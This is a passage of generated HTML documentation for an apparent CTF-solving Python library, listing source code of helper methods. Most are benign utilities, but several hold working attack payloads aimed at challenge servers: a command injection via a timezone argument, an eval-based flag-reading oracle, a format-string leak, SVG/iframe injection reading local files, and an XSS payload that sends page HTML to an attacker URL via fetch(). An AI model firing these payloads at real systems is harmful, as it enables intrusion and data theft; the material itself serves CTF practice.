    injection = &#39;Europe/Athens&#34;;cat${IFS}flag.txt;#&#39;
    cat_call = {
        &#34;jsonrpc&#34;: &#34;2.0&#34;,
        &#34;id&#34;: 2,
        &#34;method&#34;: &#34;tools/call&#34;,
        &#34;params&#34;: {&#34;name&#34;: &#34;get_current_time&#34;, &#34;arguments&#34;: {&#34;tz&#34;: injection}},
    }

    self.session.post(self.post_url, json=cat_call)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.exploit_development"><code class="name flex">
<span>def <span class="ident">exploit_development</span></span>(<span>self, i, letter)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def exploit_development(self, i, letter):
    # variable = &#34;+&#34;.join([ord(l) * 1000 * i for i, l in enumerate(&#34;ECSC{TEST}&#34;)])
    # print(variable)
    exploit = f&#34;0+(1 if open(&#39;/app/flag.txt&#39;).read()[{i}]==&#39;{letter}&#39; else 0)&#34;
    return exploit</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.exploitation"><code class="name flex">
<span>def <span class="ident">exploitation</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def exploitation(self):
    self.initiate_connection()
    self.recv_menu(4)
    self.conn.sendline(b&#34;1&#34;)
    self.conn.recvuntil(b&#34;What is your API token?\n&#34;)
    self.conn.sendline(b&#34;%p&#34; * 24)
    self.conn.recvline()
    data = self.conn.recvline().strip().decode()
    return data</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.extract_exif"><code class="name flex">
<span>def <span class="ident">extract_exif</span></span>(<span>self, file_path)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_exif(self, file_path):
    &#34;&#34;&#34;
    Description:
        Extracts EXIF data from a file

    Args:
        file_path (str): The path to the file

    Returns:
        dict: The EXIF data
    &#34;&#34;&#34;
    # with exiftool.ExifTool() as et:
    with exiftool.ExifToolHelper() as et:
        # Read the EXIF data from the file but not duplicate ones
        # metadata = et.get_metadata(
        #     file_path,
        # )

        metadata = et.get_metadata([file_path])

        # Return the EXIF data
        return metadata</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Extracts EXIF data from a file</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>file_path</code></strong> :&ensp;<code>str</code></dt>
<dd>The path to the file</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>dict</code></dt>
<dd>The EXIF data</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.extract_files_from_binary"><code class="name flex">
<span>def <span class="ident">extract_files_from_binary</span></span>(<span>self, filepath)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_files_from_binary(self, filepath):
    binwalk_obj = binwalk.Binwalk()

    results = binwalk_obj.scan(filepath)

    if not results:
        print(&#34;No files found&#34;)
        return

    for result in results:
        if result.extracted:
            print(f&#34;Extracted {result.file.path}&#34;)
            for extracted_file in result.extracted:
                print(f&#34;Extracted {extracted_file}&#34;)
        else:
            print(f&#34;Could not extract {result.file.path}&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.extract_macros_from_file"><code class="name flex">
<span>def <span class="ident">extract_macros_from_file</span></span>(<span>self, ods_file, file_name)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_macros_from_file(self, ods_file, file_name):
    &#34;&#34;&#34;
    Extracts content from a specific file inside the ODS archive.

    Args:
        ods_file (str): Path to the ODS file.
        file_name (str): Name of the file inside the archive to extract.

    Returns:
        str: The content of the specified file.
    &#34;&#34;&#34;
    try:
        with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
            with ods.open(file_name) as file:
                return file.read().decode(&#34;utf-8&#34;)
    except Exception as e:
        return f&#34;Failed to extract {file_name}: {e}&#34;</code></pre>
</details>
<div class="desc"><p>Extracts content from a specific file inside the ODS archive.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ods_file</code></strong> :&ensp;<code>str</code></dt>
<dd>Path to the ODS file.</dd>
<dt><strong><code>file_name</code></strong> :&ensp;<code>str</code></dt>
<dd>Name of the file inside the archive to extract.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The content of the specified file.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.extract_macros_from_ods"><code class="name flex">
<span>def <span class="ident">extract_macros_from_ods</span></span>(<span>self, ods_file)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_macros_from_ods(self, ods_file):
    &#34;&#34;&#34;
    Attempts to extract macros from various files in the ODS archive.

    Args:
        ods_file (str): Path to the ODS file.

    Returns:
        str: Extracted macros or debug information.
    &#34;&#34;&#34;
    try:
        # List all files in the ODS archive
        all_files = self.list_all_files(ods_file)

        # Identify potential macro-related files
        macro_candidates = [
            f
            for f in all_files
            if &#34;scripts&#34; in f or &#34;content&#34; in f or &#34;settings&#34; in f
        ]

        macros = []
        for candidate in macro_candidates:
            content = self.extract_macros_from_file(ods_file, candidate)
            if &#34;&lt;script&#34; in content or &#34;&lt;macro&#34; in content:
                macros.append(f&#34;--- Content from {candidate} ---\n{content}&#34;)

        if macros:
            return &#34;\n\n&#34;.join(macros)
        else:
            return &#34;No explicit macros found. Check the file structure manually.&#34;

    except Exception as e:
        return f&#34;An error occurred: {e}&#34;</code></pre>
</details>
<div class="desc"><p>Attempts to extract macros from various files in the ODS archive.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ods_file</code></strong> :&ensp;<code>str</code></dt>
<dd>Path to the ODS file.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>Extracted macros or debug information.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.extract_macros_from_ods_initial"><code class="name flex">
<span>def <span class="ident">extract_macros_from_ods_initial</span></span>(<span>self, ods_file=None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_macros_from_ods_initial(self, ods_file=None):
    &#34;&#34;&#34;
    Extracts macros from an ODS file.

    Args:
        ods_file (str): Path to the ODS file.

    Returns:
        str: Extracted macros, if any, as plain XML text.
    &#34;&#34;&#34;

    if ods_file is None:
        ods_file = self.challenge_file

    try:
        with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
            # List all files in the archive
            file_list = ods.namelist()

            # Look for possible macro-related files
            potential_files = [
                f
                for f in file_list
                if f in (&#34;content.xml&#34;, &#34;scripts.xml&#34;, &#34;settings.xml&#34;, &#34;meta.xml&#34;)
            ]
            macros = []

            for file_name in potential_files:
                with ods.open(file_name) as file:
                    xml_content = file.read()
                    root = ET.fromstring(xml_content)

                    # Search for common macro tags (e.g., &lt;script&gt;, &lt;macro&gt;)
                    for macro in root.iter():
                        if any(
                            keyword in macro.tag.lower()
                            for keyword in (&#34;script&#34;, &#34;macro&#34;)
                        ):
                            macros.append(ET.tostring(macro, encoding=&#34;unicode&#34;))

            if macros:
                return &#34;\n\n&#34;.join(macros)
            else:
                return &#34;No macros found in the ODS file.&#34;

    except zipfile.BadZipFile:
        return &#34;The provided file is not a valid ODS file.&#34;
    except ET.ParseError:
        return &#34;Failed to parse XML content from the ODS file.&#34;
    except Exception as e:
        return f&#34;An error occurred: {e}&#34;</code></pre>
</details>
<div class="desc"><p>Extracts macros from an ODS file.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ods_file</code></strong> :&ensp;<code>str</code></dt>
<dd>Path to the ODS file.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>Extracted macros, if any, as plain XML text.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.extract_macros_with_odfpy"><code class="name flex">
<span>def <span class="ident">extract_macros_with_odfpy</span></span>(<span>self, ods_file, files)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_macros_with_odfpy(self, ods_file, files):
    macros = []
    with zipfile.ZipFile(ods_file, &#34;r&#34;) as z:
        for file in files:
            if file.endswith(&#34;.xml&#34;):
                with z.open(file) as f:
                    try:
                        # Parse the XML file
                        tree = ET.parse(f)
                        root = tree.getroot()

                        # Search for macro-related elements
                        for elem in root.iter():
                            if elem.tag.endswith(&#34;script&#34;):
                                macros.append(ET.tostring(elem, encoding=&#34;unicode&#34;))

                    except ET.ParseError:
                        print(f&#34;Error parsing {file}. Skipping...&#34;)

    if macros:
        # Pretty-print the extracted macros
        pretty_macros = [
            parseString(macro).toprettyxml(indent=&#34;  &#34;) for macro in macros
        ]
        return &#34;\n\n&#34;.join(pretty_macros)
    else:
        return &#34;No macros found.&#34;</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.extract_printable_with_spaces"><code class="name flex">
<span>def <span class="ident">extract_printable_with_spaces</span></span>(<span>self, text)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_printable_with_spaces(self, text):
    # Remove ANSI escape sequences (e.g., \x1b[?25l, \x1b[?25h, \x1b[K, \x1b[1C, etc.)
    # ansi_escape = re.compile(r&#34;\x1b\[[0-9;?]*[A-Za-z]&#34;)
    # ansi_escape = re.compile(r&#34;\x1b\[[0-9;?]*[A-Za-z]&#34;)
    ansi_escape = re.compile(r&#34;\x1b\[.*?[@-~]&#34;)
    cleaned = ansi_escape.sub(&#34;&#34;, text)

    return cleaned</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.extract_skew1_bootkey_piece"><code class="name flex">
<span>def <span class="ident">extract_skew1_bootkey_piece</span></span>(<span>self, hive_path:str) >str</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_skew1_bootkey_piece(self, hive_path: str) -&gt; str:
    with open(hive_path, &#34;rb&#34;) as f:
        data = f.read()

    # 1) locate the ASCII string Skew1
    skew_idx = data.find(b&#34;Skew1&#34;)
    if skew_idx == -1:
        raise ValueError(&#34;Could not find Skew1 key name in hive&#34;)

    # 2) step back to the beginning of its `nk` (key-node) cell
    nk_offset = data.rfind(b&#34;nk&#34;, 0, skew_idx)  # signature 0x6E 0x6B
    if nk_offset == -1:
        raise ValueError(&#34;`nk` signature not found before Skew1&#34;)

    nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

    # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
    class_offset = struct.unpack_from(&#34;&lt;I&#34;, data, nk_cell_start + 0x30)[0]
    class_length = struct.unpack_from(&#34;&lt;H&#34;, data, nk_cell_start + 0x4E)[0]

    # The class-name offset is hive-relative (relative to first HBIN, which
    # starts immediately after the 0x1000-byte REGF header).
    class_file_offset = class_offset + 0x1000

    # 4) at that position we find another registry cell  grab its whole body
    cell_size = struct.unpack_from(&#34;&lt;i&#34;, data, class_file_offset)[0]
    cell_len = abs(cell_size)  # value is stored as negative
    cell_blob = data[class_file_offset : class_file_offset + cell_len]

    # 5) build the flag
    return f&#34;ECSC{{{cell_blob.hex().upper()}}}&#34;</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.find_collision"><code class="name flex">
<span>def <span class="ident">find_collision</span></span>(<span>self, target_hash, max_length=10, prefix='', suffix='', lengthy=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def find_collision(
    self, target_hash, max_length=10, prefix=&#34;&#34;, suffix=&#34;&#34;, lengthy=False
):
    # Define the character set to use for generating combinations
    charset = (
        string.ascii_letters + string.digits
    )  # You can add special characters if needed

    if lengthy:
        for length in range(1, max_length + 1):
            for combination in itertools.product(charset, repeat=length):
                candidate = prefix + &#34;&#34;.join(combination) + suffix
                print(candidate, self.md5_hash(candidate), self.target_hash)

                if self.md5_hash(candidate) == target_hash:
                    return candidate
    else:
        # Iterate over lengths from 1 to max_length
        for combination in itertools.product(
            charset, repeat=max_length - len(prefix) - len(suffix)
        ):
            candidate = prefix + &#34;&#34;.join(combination) + suffix
            print(candidate, self.md5_hash(candidate), self.target_hash)
            if self.md5_hash(candidate) == target_hash:
                return candidate
    return None</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.find_invpow"><code class="name flex">
<span>def <span class="ident">find_invpow</span></span>(<span>self, x, n)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def find_invpow(self, x, n):
    &#34;&#34;&#34;Finds the integer component of the n&#39;th root of x,
    an integer such that y ** n &lt;= x &lt; (y + 1) ** n.
    &#34;&#34;&#34;
    high = 1
    while high**n &lt; x:
        high *= 2
    low = high // 2
    while low &lt; high:
        mid = (low + high) // 2
        if low &lt; mid and mid**n &lt; x:
            low = mid
        elif high &gt; mid and mid**n &gt; x:
            high = mid
        else:
            return mid
    return mid + 1</code></pre>
</details>
<div class="desc"><p>Finds the integer component of the n'th root of x,
an integer such that y ** n &lt;= x &lt; (y + 1) ** n.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.find_offset"><code class="name flex">
<span>def <span class="ident">find_offset</span></span>(<span>self, pattern, n=8)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def find_offset(self, pattern, n=8):
    &#34;&#34;&#34;
    Finds the offset of a given pattern in the cyclic pattern.

    Args:
        pattern (str): The pattern to find the offset for.
        n (int): The number of unique characters in the pattern.

    Returns:
        int: The offset of the pattern.
    &#34;&#34;&#34;
    return self.pwn.cyclic_find(pattern, n=n)</code></pre>
</details>
<div class="desc"><p>Finds the offset of a given pattern in the cyclic pattern.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>pattern</code></strong> :&ensp;<code>str</code></dt>
<dd>The pattern to find the offset for.</dd>
<dt><strong><code>n</code></strong> :&ensp;<code>int</code></dt>
<dd>The number of unique characters in the pattern.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>int</code></dt>
<dd>The offset of the pattern.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.finding_next_prime"><code class="name flex">
<span>def <span class="ident">finding_next_prime</span></span>(<span>self, number, n=None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def finding_next_prime(self, number, n=None):
    if n:
        for _ in range(number, number + n):
            if self.is_prime(number):
                return number
    else:
        while True:
            number = number + 1
            if self.is_prime(number):
                return number</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.from_hex"><code class="name flex">
<span>def <span class="ident">from_hex</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def from_hex(self, data):
    return &#34;&#34;.join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.gathering"><code class="name flex">
<span>def <span class="ident">gathering</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def gathering(self):
    pass</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.generate_cipher"><code class="name flex">
<span>def <span class="ident">generate_cipher</span></span>(<span>self, aes_key, iv)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def generate_cipher(self, aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.generate_pattern"><code class="name flex">
<span>def <span class="ident">generate_pattern</span></span>(<span>self, length=1, n=8)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def generate_pattern(self, length=1, n=8):
    &#34;&#34;&#34;
    Generates a cyclic pattern of a given length.

    Args:
        length (int): The length of the pattern to generate.
        n (int): The number of unique characters in the pattern.

    Returns:
        str: The generated cyclic pattern.
    &#34;&#34;&#34;
    return self.pwn.cyclic(length=length, n=n)</code></pre>
</details>
<div class="desc"><p>Generates a cyclic pattern of a given length.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>length</code></strong> :&ensp;<code>int</code></dt>
<dd>The length of the pattern to generate.</dd>
<dt><strong><code>n</code></strong> :&ensp;<code>int</code></dt>
<dd>The number of unique characters in the pattern.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The generated cyclic pattern.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.generate_payload"><code class="name flex">
<span>def <span class="ident">generate_payload</span></span>(<span>self, attacker_url)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def generate_payload(self, attacker_url):
    payload = &#34;&#34;&#34;
    &lt;script&gt;
    const iframe = document.createElement(&#39;iframe&#39;);
    iframe.srcdoc = `
    &lt;script&gt;
    window.parent.postMessage({
        style: {
        &#34;webkitUserModify&#34;: &#34;read-write&#34;
        }
    }, &#39;*&#39;);
    &lt;\\/script&gt;
`;
    document.body.appendChild(iframe);

    setTimeout(() =&gt; {
        window.find(&#39;Here&#39;);
        document.execCommand(&#39;insertHTML&#39;, false, `&lt;img src=x onerror=&#34;fetch(&#39;EXFIL_URL&#39;+this.parentElement.outerHTML)&#34;&gt;`)
    }, 1000);
    &lt;/script&gt;
    &#34;&#34;&#34;.replace(
        &#34;EXFIL_URL&#34;, attacker_url
    )

    return payload</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.generate_url"><code class="name flex">
<span>def <span class="ident">generate_url</span></span>(<span>self, attacker_url, payload)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def generate_url(self, attacker_url, payload):
    &#34;&#34;&#34;
    Description:
        Generate a URL with the given attacker URL and payload.

    Args:
        attacker_url (_type_): _description_
        payload (_type_): _description_

    Returns:
        _type_: _description_
    &#34;&#34;&#34;
    base_url = &#34;http://localhost/index.php&#34;

    parsed_url = urllib.parse.quote(payload)
    print(parsed_url)
    params_suffix = &#34;&amp;p=1&#34; * 1500
    return f&#34;{base_url}?xss={parsed_url}{params_suffix}&#34;</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Generate a URL with the given attacker URL and payload.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>attacker_url</code></strong> :&ensp;<code>_type_</code></dt>
<dd><em>description</em></dd>
<dt><strong><code>payload</code></strong> :&ensp;<code>_type_</code></dt>
<dd><em>description</em></dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>_type_</code></dt>
<dd><em>description</em></dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.generating"><code class="name flex">
<span>def <span class="ident">generating</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def generating(self):

    # exploit = &#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;250&#34; width=&#34;500&#34; height=&#34;250&#34; href=&#34;file:///app/flag.txt&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

    # filename = &#34;static/memes/doge.png&#34;

    # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;10&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;file://{filename}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

    online_meme_url = f&#34;http://{self.url}:{self.port}/memes/doge&#34;

    # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;500&#34; height=&#34;250&#34; href=&#34;{online_meme_url}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34; font-size=&#34;40&#34; fill=&#34;red&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

    # filename = &#34;/flag.txt&#34;
    # filename = base64.b64encode(filename.encode()).decode()
    # data:image/png;base64,
    # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;g id=&#34;foreground&#34;&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;/g&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;
    # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;
    # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;

    filename = &#34;/flag.txt&#34;

    # exploit = f&#34;&#34;&#34;&lt;/text&gt;&lt;foreignObject&gt;&lt;iframe  src=&#34;file://{filename}&#34;/&gt;&lt;/foreignObject&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;
    exploit = f&#34;&#34;&#34;&lt;/text&gt;&lt;foreignObject&gt;&lt;iframe  src=&#34;{online_meme_url}&#34;/&gt;&lt;/foreignObject&gt;&lt;text y=&#34;45&#34;&gt;A&#34;&#34;&#34;

    # exploit = f&#34;&#34;&#34;M&lt;/text&gt;&lt;g id=&#34;foreground&#34;&gt;&lt;image x=&#34;0&#34; y=&#34;0&#34; width=&#34;50&#34; height=&#34;50&#34; href=&#34;data:image/png;base64,{filename}&#34;/&gt;&lt;/g&gt;&lt;text x=&#34;50%&#34; y=&#34;45&#34;  fill=&#34;blue&#34; stroke=&#34;red&#34;&gt;A&#34;&#34;&#34;

    print(len(exploit))
    print(exploit)

    payload = {
        &#34;name&#34;: &#34;everywhere&#34;,
        # &#34;name&#34;: &#34;doge&#34;,
        &#34;topText&#34;: &#34;lol&#34;,
        &#34;bottomText&#34;: exploit,
    }

    headers = {&#34;Content-Type&#34;: &#34;application/json&#34;}

    response = requests.post(self.new_url, json=payload, headers=headers)

    if response.status_code == 200 and &#34;result&#34; in response.json():
        self.meme = response.json()[&#34;result&#34;]
        self.meme_url = f&#34;http://{self.url}:{self.port}/{self.meme}&#34;
        print(self.meme_url)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.generator"><code class="name flex">
<span>def <span class="ident">generator</span></span>(<span>self, g, x, p)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def generator(self, g, x, p):
    return pow(g, x) % p</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_address"><code class="name flex">
<span>def <span class="ident">get_address</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_address(self):
    # win = self.elf.symbols[&#34;win&#34;]
    # self.win_address = hex(win)
    self.win_address = self.elf.symbols[&#34;win&#34;]
    self.win_address = hex(self.win_address)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_attributes"><code class="name flex">
<span>def <span class="ident">get_attributes</span></span>(<span>self, variable)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_attributes(self, variable):
    &#34;&#34;&#34;
    Get all attributes of a variable
    &#34;&#34;&#34;

    return [
        attr
        for attr in dir(variable)
        if not callable(getattr(variable, attr)) and not (attr.startswith(&#34;__&#34;))
    ]</code></pre>
</details>
<div class="desc"><p>Get all attributes of a variable</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_cell_size"><code class="name flex">
<span>def <span class="ident">get_cell_size</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_cell_size(self):
    reg = Registry.Registry(self.challenge_file)
    print(self.get_functions(reg, under=False))

    lsa_key = reg.open(r&#34;ControlSet001&#34;)
    print(self.get_functions(lsa_key))</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_elf_function_address"><code class="name flex">
<span>def <span class="ident">get_elf_function_address</span></span>(<span>self, function)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_elf_function_address(self, function):
    &#34;&#34;&#34;
    Description:
    &#34;&#34;&#34;
    if self.elf is None:
        self.elf = self.pwn.ELF(self.challenge_file)

    return self.elf.symbols[function]</code></pre>
</details>
<div class="desc"><p>Description:</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_flag_length"><code class="name flex">
<span>def <span class="ident">get_flag_length</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_flag_length(self):
    exploit = &#34;0+len(open(&#39;/app/flag.txt&#39;).read())&#34;
    response = self.sending_request(exploit=exploit, verbose=False)
    if response and &#34;result&#34; in response:
        try:
            self.flag_length = int(response[&#34;result&#34;])
            print(f&#34;[+] Flag length: {self.flag_length}&#34;)
        except ValueError:
            print(&#34;[-] Failed to parse flag length.&#34;)
    else:
        print(&#34;[-] No valid response received.&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_functions"><code class="name flex">
<span>def <span class="ident">get_functions</span></span>(<span>self, variable, under=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_functions(self, variable, under=False):
    &#34;&#34;&#34;
    Get all functions of a variable
    &#34;&#34;&#34;

    return [
        func
        for func in dir(variable)
        if callable(getattr(variable, func))
        and (under or not (func.startswith(&#34;__&#34;)))
    ]</code></pre>
</details>
<div class="desc"><p>Get all functions of a variable</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_instruments"><code class="name flex">
<span>def <span class="ident">get_instruments</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_instruments(self):
    &#34;&#34;&#34;
    Returns a list of instruments in the MIDI file.
    &#34;&#34;&#34;

    for instrument in self.midi_data.instruments:
        print(instrument)
    return self.midi_data.instruments</code></pre>
</details>
<div class="desc"><p>Returns a list of instruments in the MIDI file.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_message"><code class="name flex">
<span>def <span class="ident">get_message</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_message(self):
    with open(self.challenge_file, &#34;r&#34;) as f:
        self.message_data = f.read().strip()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_online_passwords"><code class="name flex">
<span>def <span class="ident">get_online_passwords</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_online_passwords(self):
    r = requests.get(self.passwords_source)
    self.password_list = r.text.split(&#34;\n&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_output_variables"><code class="name flex">
<span>def <span class="ident">get_output_variables</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_output_variables(self):
    with open(self.challenge_file, &#34;r&#34;) as f:
        self.variables = {
            line.split(&#34; = &#34;)[0]: int(line.strip(&#34;\n&#34;).split(&#34; = &#34;)[1])
            for line in f
        }</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_registers"><code class="name flex">
<span>def <span class="ident">get_registers</span></span>(<span>self, address, count=125)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_registers(self, address, count=125):
    result = self.client.read_holding_registers(address=address, count=count)
    if not result.isError():
        return result.registers
    else:
        print(&#34;Error reading registers:&#34;, result)
        return None</code></pre>
</details>
<div class="desc"></div>
</dd>
